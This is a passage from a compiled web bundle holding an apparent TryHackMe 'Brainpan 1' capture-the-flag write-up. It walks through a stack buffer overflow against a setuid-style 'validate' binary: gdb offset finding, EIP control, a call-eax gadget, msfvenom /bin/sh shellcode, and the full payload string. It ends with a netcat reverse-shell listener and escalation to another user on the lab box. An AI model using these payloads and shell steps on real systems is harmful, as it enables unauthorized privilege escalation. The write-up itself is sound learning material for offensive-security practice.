folder ",(0,t.jsx)(n.code,{children:"/bin/cp validate /home/puck/web/bin"})," so I could download it to my local machine to work on it."]}),"\n",(0,t.jsx)(n.p,{children:"When I run it, it does the following:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ ./validate\nusage ./validate <input />\n\n\u2514\u2500$ ./validate 12345\nvalidating input...passed.\n"})}),"\n",(0,t.jsx)(n.p,{children:"Looks like a possible buffer overflow situation."}),"\n",(0,t.jsx)(n.p,{children:"Also, when I run strings on the binary, a few key words stand out:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"strings validate\n/lib/ld-linux.so.2\n__gmon_start__\nlibc.so.6\n_IO_stdin_used\nstrcpy # <-- we know this is vulnerable to overflow\nvalidate\nmain\nvalidate.c\nlong long int\nunsigned char\nmain\n/root/bin/brainpan # <-- running a binary as root?\nlong long unsigned int\n"})}),"\n",(0,t.jsx)(n.p,{children:"check some other info about the file:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"$ file validate\nvalidate: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.15, BuildID[sha1]=c4b7d3019dda6ebc259c4e4b63a336e00a63b949, with debug_info, not stripped\n\n$ binwalk validate\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)\n"})}),"\n",(0,t.jsx)(n.p,{children:"I will use gdb on my local machine to develop the overflow payload."}),"\n",(0,t.jsx)(n.p,{children:"Open the binary up in gdb:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'$ gdb ./validate\nGNU gdb (Debian 10.1-2) 10.1.90.20210103-git\nCopyright (C) 2021 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html />\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nType "show copying" and "show warranty" for details.\nThis GDB was configured as "x86_64-linux-gnu".\nType "show configuration" for configuration details.\nFor bug reporting instructions, please see:\n<https://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n    <http://www.gnu.org/software/gdb/documentation/>.\n\nFor help, type "help".\nType "apropos word" to search for commands related to "word"...\nReading symbols from ./validate...\n(gdb)\n'})}),"\n",(0,t.jsx)(n.h4,{id:"validate-offset",children:"validate offset"}),"\n",(0,t.jsx)(n.p,{children:"Let's find the offset, create the pattern first:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]\n\u2514\u2500$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 120\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Feed this as input to our ",(0,t.jsx)(n.code,{children:"./validate"})," program in gdb:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(gdb) run $(python -c \"print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9'\")\nStarting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c \"print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9'\")\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x39644138 in ?? ()\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Query the return address in our ",(0,t.jsx)(n.code,{children:"pattern_offset"}),", to find the offset:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]\n\u2514\u2500$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 120 -q 39644138\n[*] Exact match at offset 116\n"})}),"\n",(0,t.jsxs)(n.p,{children:["We now have our payload length which is the offset size: ",(0,t.jsx)(n.code,{children:"116"})," bytes (don't include the return address 4 bytes)."]}),"\n",(0,t.jsx)(n.admonition,{type:"info",children:(0,t.jsxs)(n.p,{children:["All my own work after this point did not yield any results so from this point on I'm following this great write-up by ",(0,t.jsx)(n.a,{href:"https://resources.infosecinstitute.com/topic/brainpan_virtual_machine/",children:"Interfence Security"})," at infosecinstitute."]})}),"\n",(0,t.jsx)(n.h4,{id:"validate-payload",children:"validate payload"}),"\n",(0,t.jsx)(n.admonition,{title:"Further Understanding needed!",type:"danger",children:(0,t.jsx)(n.p,{children:"I don't understand why the payload is in the order it is i.e. why sometimes the NOP comes before shellcodes instead of after, when do we know we need alignment bytes? I need to find more understanding of what determines what in the payload."})}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"payload = shellcode + NOP"})," (116 bytes) + ",(0,t.jsx)(n.code,{children:"return_address"})," (4 bytes)"]}),"\n",(0,t.jsx)(n.h4,{id:"validate-eip",children:"validate EIP"}),"\n",(0,t.jsx)(n.p,{children:"verify that we control the EIP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(gdb) run $(python -c \"print 'A'*116 + 'B'*4\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c \"print 'A'*116 + 'B'*4\")\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n"})}),"\n",(0,t.jsx)(n.p,{children:"yes we can control the EIP."}),"\n",(0,t.jsx)(n.h4,{id:"validate-return-address",children:"validate return address"}),"\n",(0,t.jsxs)(n.p,{children:["Find an instruction to ",(0,t.jsx)(n.code,{children:"jmp"})," to our shellcode."]}),"\n",(0,t.jsx)(n.p,{children:"check what's in the registers:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'(gdb) i r\neax            0xffffcf08          -12536\necx            0xffffd2e0          -11552\nedx            0xffffcf78          -12424\nebx            0x41414141          1094795585\nesp            0xffffcf80          0xffffcf80\nebp            0x41414141          0x41414141\nesi            0x2                 2\nedi            0x8048400           134513664\neip            0x42424242          0x42424242\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/s $esp\n0xffffcf80:     ""\n(gdb) x/s $eip\n0x42424242:     <error: Cannot access memory at address 0x42424242 />\n(gdb) x/s $eax\n0xffffcf08:     \'A\' <repeats 116 times />, "BBBB"\n'})}),"\n",(0,t.jsxs)(n.p,{children:["note: ",(0,t.jsx)(n.code,{children:"$esp"})," is pointing at nothing and ",(0,t.jsx)(n.code,{children:"$eax"})," is pointing to our shellcode place-holders (i.e. the A's), so we use ",(0,t.jsx)(n.code,{children:"$eax"})," to jump to our shellcode."]}),"\n",(0,t.jsxs)(n.p,{children:["Let's see if there's a ",(0,t.jsx)(n.code,{children:"jmp"})," instruction in the binary that can get us to the ",(0,t.jsx)(n.code,{children:"eax"})," register:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]\n\u2514\u2500$ objdump -d validate | grep -i jmp\n 8048382:       ff 25 fc 9f 04 08       jmp    *0x8049ffc\n 804838c:       ff 25 00 a0 04 08       jmp    *0x804a000\n 8048397:       e9 e0 ff ff ff          jmp    804837c <.plt>\n 804839c:       ff 25 04 a0 04 08       jmp    *0x804a004\n 80483a7:       e9 d0 ff ff ff          jmp    804837c <.plt>\n 80483ac:       ff 25 08 a0 04 08       jmp    *0x804a008\n 80483b7:       e9 c0 ff ff ff          jmp    804837c <.plt>\n 80483bc:       ff 25 0c a0 04 08       jmp    *0x804a00c\n 80483c7:       e9 b0 ff ff ff          jmp    804837c <.plt>\n 80483cc:       ff 25 10 a0 04 08       jmp    *0x804a010\n 80483d7:       e9 a0 ff ff ff          jmp    804837c <.plt>\n 80483dc:       ff 25 14 a0 04 08       jmp    *0x804a014\n 80483e7:       e9 90 ff ff ff          jmp    804837c <.plt>\n 80483ec:       ff 25 18 a0 04 08       jmp    *0x804a018\n 80483f7:       e9 80 ff ff ff          jmp    804837c <.plt>\n 80484cc:       eb 3a                   jmp    8048508 <validate+0x54 />\n 8048562:       eb 39                   jmp    804859d <main+0x65 />\n"})}),"\n",(0,t.jsxs)(n.p,{children:["no ",(0,t.jsx)(n.code,{children:"jmp"})," instructions. what about a ",(0,t.jsx)(n.code,{children:"call"})," instruction?"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]\n\u2514\u2500$ objdump -d validate| grep -i call\n 8048353:       e8 00 00 00 00          call   8048358 <_init+0xc>\n 8048369:       e8 1e 00 00 00          call   804838c <__gmon_start__@plt>\n 804836e:       e8 1d 01 00 00          call   8048490 <frame_dummy />\n 8048373:       e8 98 02 00 00          call   8048610 <__do_global_ctors_aux>\n 804841c:       e8 7b ff ff ff          call   804839c <__libc_start_main@plt>\n 8048468:       ff 14 85 14 9f 04 08    call   *0x8049f14(,%eax,4)\n 80484af:       ff d0                   call   *%eax         # <--- here's one!\n 80484f3:       e8 d4 fe ff ff          call   80483cc <printf@plt />\n 80484ff:       e8 e8 fe ff ff          call   80483ec <exit@plt />\n 8048511:       e8 96 fe ff ff          call   80483ac <strlen@plt />\n 8048527:       e8 90 fe ff ff          call   80483bc <strcpy@plt />\n 8048558:       e8 6f fe ff ff          call   80483cc <printf@plt />\n 804856c:       e8 5b fe ff ff          call   80483cc <printf@plt />\n 804857c:       e8 33 ff ff ff          call   80484b4 <validate />\n 8048593:       e8 44 fe ff ff          call   80483dc <puts@plt />\n 80485b6:       e8 4f 00 00 00          call   804860a <__i686.get_pc_thunk.bx>\n 80485c4:       e8 83 fd ff ff          call   804834c <_init>\n 80485f4:       ff 94 b3 18 ff ff ff    call   *-0xe8(%ebx,%esi,4)\n 804862b:       ff d0                   call   *%eax         # <--- here's another!\n 8048643:       e8 00 00 00 00          call   8048648 <_fini+0xc>\n 804864f:       e8 dc fd ff ff          call   8048430 <__do_global_dtors_aux>\n"})}),"\n",(0,t.jsxs)(n.p,{children:["success! we have two instructions at memory address ",(0,t.jsx)(n.code,{children:"80484af"})," and ",(0,t.jsx)(n.code,{children:"804862b"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["I'm going to use the 2nd one: ",(0,t.jsx)(n.code,{children:"804862b"})," (add a ",(0,t.jsx)(n.code,{children:"0"})," at the start)."]}),"\n",(0,t.jsxs)(n.p,{children:["In little endian format, our return address = ",(0,t.jsx)(n.code,{children:"\\x2b\\x86\\x04\\x08"}),"."]}),"\n",(0,t.jsx)(n.h4,{id:"validate-shellcode",children:"validate shellcode"}),"\n",(0,t.jsxs)(n.p,{children:["We already have a remote shell access to the box, so let's just spawn a new ",(0,t.jsx)(n.code,{children:"/bin/sh"})," instance, this time with escalated privileges."]}),"\n",(0,t.jsxs)(n.p,{children:["Let's use ",(0,t.jsx)(n.code,{children:"msfvenom"})," to generate some shellcode."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'\u2514\u2500$ msfvenom -a x86 --platform linux -p linux/x86/exec CMD=/bin/sh -b \'\\x00\' -f c\nFound 11 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 70 (iteration=0)\nx86/shikata_ga_nai chosen with final size 70\nPayload size: 70 bytes\nFinal size of c file: 319 bytes\nunsigned char buf[] =\n"\\xbd\\x2c\\x4e\\x7f\\xb7\\xd9\\xcd\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1"\n"\\x0b\\x31\\x68\\x15\\x83\\xe8\\xfc\\x03\\x68\\x11\\xe2\\xd9\\x24\\x74\\xef"\n"\\xb8\\xeb\\xec\\x67\\x97\\x68\\x78\\x90\\x8f\\x41\\x09\\x37\\x4f\\xf6\\xc2"\n"\\xa5\\x26\\x68\\x94\\xc9\\xea\\x9c\\xae\\x0d\\x0a\\x5d\\x80\\x6f\\x63\\x33"\n"\\xf1\\x1c\\x1b\\xcb\\x5a\\xb0\\x52\\x2a\\xa9\\xb6";\n'})}),"\n",(0,t.jsx)(n.p,{children:"check shellcode size with python:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'\u2514\u2500$ python3\nPython 3.9.10 (main, Feb 22 2022, 13:54:07)\n[GCC 11.2.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> shell = (\n... "\\xbd\\x2c\\x4e\\x7f\\xb7\\xd9\\xcd\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1"\n... "\\x0b\\x31\\x68\\x15\\x83\\xe8\\xfc\\x03\\x68\\x11\\xe2\\xd9\\x24\\x74\\xef"\n... "\\xb8\\xeb\\xec\\x67\\x97\\x68\\x78\\x90\\x8f\\x41\\x09\\x37\\x4f\\xf6\\xc2"\n... "\\xa5\\x26\\x68\\x94\\xc9\\xea\\x9c\\xae\\x0d\\x0a\\x5d\\x80\\x6f\\x63\\x33"\n... "\\xf1\\x1c\\x1b\\xcb\\x5a\\xb0\\x52\\x2a\\xa9\\xb6"\n... )\n>>> print(len(shell))\n70\n>>>\n'})}),"\n",(0,t.jsx)(n.p,{children:"from our payload math above, we have this:"}),"\n",(0,t.jsxs)(n.table,{children:[(0,t.jsx)(n.thead,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"payload"}),(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"shellcode + NOP"}),(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"return address"})]})}),(0,t.jsx)(n.tbody,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"116 bytes"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"shellcode(70) + NOP (46)"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"4 bytes"})]})})]}),"\n",(0,t.jsx)(n.p,{children:"our payload in full:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(gdb) run $(python -c \"print ('\\xbd\\x2c\\x4e\\x7f\\xb7\\xd9\\xcd\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1\\x0b\\x31\\x68\\x15\\x83\\xe8\\xf\nc\\x03\\x68\\x11\\xe2\\xd9\\x24\\x74\\xef\\xb8\\xeb\\xec\\x67\\x97\\x68\\x78\\x90\\x8f\\x41\\x09\\x37\\x4f\\xf6\\xc2\\xa5\\x26\\x68\\x94\\xc9\\xea\\\nx9c\\xae\\x0d\\x0a\\x5d\\x80\\x6f\\x63\\x33\\xf1\\x1c\\x1b\\xcb\\x5a\\xb0\\x52\\x2a\\xa9\\xb6') + ('\\x90'*46) + ('\\xaf\\x84\\x04\\x08')\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c \"print ('\\xbd\\x2\nc\\x4e\\x7f\\xb7\\xd9\\xcd\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1\\x0b\\x31\\x68\\x15\\x83\\xe8\\xfc\\x03\\x68\\x11\\xe2\\xd9\\x24\\x74\\xef\\xb8\\\nxeb\\xec\\x67\\x97\\x68\\x78\\x90\\x8f\\x41\\x09\\x37\\x4f\\xf6\\xc2\\xa5\\x26\\x68\\x94\\xc9\\xea\\x9c\\xae\\x0d\\x0a\\x5d\\x80\\x6f\\x63\\x33\\xf\n1\\x1c\\x1b\\xcb\\x5a\\xb0\\x52\\x2a\\xa9\\xb6') + ('\\x90'*46) + ('\\xaf\\x84\\x04\\x08')\")\nvalidating input...passed.\n[Inferior 1 (process 114848) exited normally]\n"})}),"\n",(0,t.jsxs)(n.admonition,{title:"Debug Payload",type:"danger",children:[(0,t.jsxs)(n.p,{children:['The payload kept "passing" and exiting normally. I re-checked the ',(0,t.jsx)(n.code,{children:"python -c \"print 'A' * 70 + 'B' * 46 + 'C' * 4\""})," to make sure a) the EIP was still under my control and b) it still crashes with this payload length."]}),(0,t.jsx)(n.p,{children:"After that I determined the shellcode was at fault and re-checked my badchars in the next section."})]}),"\n",(0,t.jsx)(n.h4,{id:"correct-overflow",children:"correct overflow"}),"\n",(0,t.jsxs)(n.p,{children:["Re-generate my shellcode, this time using the bad characters list ",(0,t.jsx)(n.code,{children:"x00x0axff"})," from the write-up:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'\u2500$ msfvenom -p linux/x86/exec CMD=/bin/sh -b \'x00x0axff\' -f c\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nFound 11 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 70 (iteration=0)\nx86/shikata_ga_nai chosen with final size 70\nPayload size: 70 bytes\nFinal size of c file: 319 bytes\nunsigned char buf[] =\n"\\xbf\\xbf\\x9a\\x24\\x9f\\xdb\\xd4\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\\xb1"\n"\\x0b\\x31\\x7a\\x15\\x03\\x7a\\x15\\x83\\xc2\\x04\\xe2\\x4a\\xf0\\x2f\\xc7"\n"\\x2d\\x57\\x56\\x9f\\x60\\x3b\\x1f\\xb8\\x12\\x94\\x6c\\x2f\\xe2\\x82\\xbd"\n"\\xcd\\x8b\\x3c\\x4b\\xf2\\x19\\x29\\x43\\xf5\\x9d\\xa9\\x7b\\x97\\xf4\\xc7"\n"\\xac\\x24\\x6e\\x18\\xe4\\x99\\xe7\\xf9\\xc7\\x9e";\n'})}),"\n",(0,t.jsx)(n.p,{children:"check shellcode size again with python3:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'\u2514\u2500$ python3\nPython 3.9.10 (main, Feb 22 2022, 13:54:07)\n[GCC 11.2.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> shell = (\n... "\\xbf\\xbf\\x9a\\x24\\x9f\\xdb\\xd4\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\\xb1"\n... "\\x0b\\x31\\x7a\\x15\\x03\\x7a\\x15\\x83\\xc2\\x04\\xe2\\x4a\\xf0\\x2f\\xc7"\n... "\\x2d\\x57\\x56\\x9f\\x60\\x3b\\x1f\\xb8\\x12\\x94\\x6c\\x2f\\xe2\\x82\\xbd"\n... "\\xcd\\x8b\\x3c\\x4b\\xf2\\x19\\x29\\x43\\xf5\\x9d\\xa9\\x7b\\x97\\xf4\\xc7"\n... "\\xac\\x24\\x6e\\x18\\xe4\\x99\\xe7\\xf9\\xc7\\x9e"\n... )\n>>> print(len(shell))\n70\n>>>\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"run $(python -c \"print ('\\xbf\\xbf\\x9a\\x24\\x9f\\xdb\\xd4\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\\xb1\\x0b\\x31\\x7a\\x15\\x03\\x7a\\x15\\x83\\xc2\\x04\\xe2\\x4a\\xf0\\x2f\\xc7\\x2d\\x57\\x56\\x9f\\x60\\x3b\\x1f\\xb8\\x12\\x94\\x6c\\x2f\\xe2\\x82\\xbd\\xcd\\x8b\\x3c\\x4b\\xf2\\x19\\x29\\x43\\xf5\\x9d\\xa9\\x7b\\x97\\xf4\\xc7\\xac\\x24\\x6e\\x18\\xe4\\x99\\xe7\\xf9\\xc7\\x9e') + ('\\x90'*46) + ('\\x2b\\x86\\x04\\x08')\")\n"})}),"\n",(0,t.jsx)(n.p,{children:"test it on my local kali vm:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(gdb) run $(python -c \"print ('\\xbf\\xbf\\x9a\\x24\\x9f\\xdb\\xd4\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\\xb1\\x0b\\x31\\x7a\\x15\\x03\\x7a\\x15\\x83\\xc2\\x04\\xe2\\x4a\\xf0\\x2f\\xc7\\x2d\\x57\\x56\\x9f\\x60\\x3b\\x1f\\xb8\\x12\\x94\\x6c\\x2f\\xe2\\x82\\xbd\\xcd\\x8b\\x3c\\x4b\\xf2\\x19\\x29\\x43\\xf5\\x9d\\xa9\\x7b\\x97\\xf4\\xc7\\xac\\x24\\x6e\\x18\\xe4\\x99\\xe7\\xf9\\xc7\\x9e') + ('\\x90'*46) + ('\\x2b\\x86\\x04\\x08')\")\nStarting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c \"print ('\\xbf\\xbf\\x9a\\x24\\x9f\\xdb\\xd4\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\\xb1\\x0b\\x31\\x7a\\x15\\x03\\x7a\\x15\\x83\\xc2\\x04\\xe2\\x4a\\xf0\\x2f\\xc7\\x2d\\x57\\x56\\x9f\\x60\\x3b\\x1f\\xb8\\x12\\x94\\x6c\\x2f\\xe2\\x82\\xbd\\xcd\\x8b\\x3c\\x4b\\xf2\\x19\\x29\\x43\\xf5\\x9d\\xa9\\x7b\\x97\\xf4\\xc7\\xac\\x24\\x6e\\x18\\xe4\\x99\\xe7\\xf9\\xc7\\x9e') + ('\\x90'*46) + ('\\x2b\\x86\\x04\\x08')\")\nprocess 115163 is executing new program: /usr/bin/dash\n[Detaching after vfork from child process 115165]\n$ whoami\nkali\n"})}),"\n",(0,t.jsx)(n.p,{children:"And now take our payload to the TryHackMe box:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# listener running, and then fire the ./thm-linux.py script from before\n\n\u2514\u2500$ sudo rlwrap nc -lnvp 80\n[sudo] password for kali:\nlistening on [any] 80 ...\nconnect to [10.11.55.83] from (UNKNOWN) [10.10.180.131] 38600\nwhoami\npuck\n/usr/bin/python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ncd /usr/local/bin\ncd /usr/local/bin\nls\nls\nvalidate\n./validate $(python -c \"print ('\\xbf\\xbf\\x9a\\x24\\x9f\\xdb\\xd4\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\\xb1\\x0b\\x31\\x7a\\x15\\x03\\x7a\\x15\\x83\\xc2\\x04\\xe2\\x4a\\xf0\\x2f\\xc7\\x2d\\x57\\x56\\x9f\\x60\\x3b\\x1f\\xb8\\x12\\x94\\x6c\\x2f\\xe2\\x82\\xbd\\xcd\\x8b\\x3c\\x4b\\xf2\\x19\\x29\\x43\\xf5\\x9d\\xa9\\x7b\\x97\\xf4\\xc7\\xac\\x24\\x6e\\x18\\xe4\\x99\\xe7\\xf9\\xc7\\x9e') + ('\\x90'*46) + ('\\x2b\\x86\\x04\\x08')\")\n<e\\x18\\xe4\\x99\\xe7\\xf9\\xc7\\x9e') + ('\\x90'*46) + ('\\x2b\\x86\\x04\\x08')\")\nwhoami\nwhoami\nanansi\n$\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"privesc validate",src:x(2602).A+"",width:"937",height:"337"})}),"\n",(0,t.jsx)(n.p,{children:"Success!"}),"\n",(0,t.jsxs)(n.p,{children:["The pathway from here according to the write-ups is circling back around to the script found in the ",(0,t.jsx)(n.code,{children:"sudo"})," method and then having sudo spawn a ",(0,t.jsx)(n.code,{children:"/bin/sh"})," again to elevate user privileges to ",(0,t.jsx)(n.code,{children:"root"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"End."})]})}function l(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}}}]);